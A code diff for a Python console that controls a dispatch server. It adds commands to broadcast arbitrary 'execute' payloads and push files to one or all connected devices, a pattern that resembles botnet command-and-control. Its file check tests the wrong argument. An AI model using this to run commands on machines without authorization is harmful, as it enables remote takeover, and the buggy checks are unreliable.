@@ -1,5 +1,9 @@
+from socketHelpers.packet import Packet
+
 from consoleInterpreter import *
 from server import DispatchServer
+
+import os
 
 ds = DispatchServer("localhost", 2000)
 cc = CommandConsole()
@@ -17,16 +21,38 @@ def ccount(x):
     return len(ds)
 
 
-@cc.command(["execute"],
-    Arg(object, "target device"),
-    Arg(int, "Payload index.", optional=True))
+@cc.command(["payload", "pay"],
+    Arg(str, "target device"),
+    Arg(str, "Payload."))
 def cexecute(x):
     pass
+
+@cc.command(["payloaddis", "paydis"],
+    Arg(str, "Payload."))
+def cdistibute(x):
+    return ds.distribute_packet(Packet("execute", x[0]))
+
+
+@cc.command(["file"],
+    Arg(str, "target device"),
+    Arg(str, "Path to file."),
+    Arg(str, "Destination filename."))
+def cfile(x):
+    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
+    if not os.path.exists(x[1]) : return "Can not find file '%s'"%x[1]
+    return ds[x[0]].send_file(x[1], x[2])
+
+@cc.command(["filedis"],
+    Arg(str, "Path to file."),
+    Arg(str, "Destination filename."))
+def cfiledis(x):
+    if not os.path.exists(x[1]) : return "Can not find file '%s'"%x[1]
+    return ds.distribute_file(x[0], x[1])
 
 
 ds.start()
 while True:
-    print(c.handleExecute(input(": ")))
+    print(cc.handleExecute(input(": ")))
 
 
-print(c)
+print(cc)
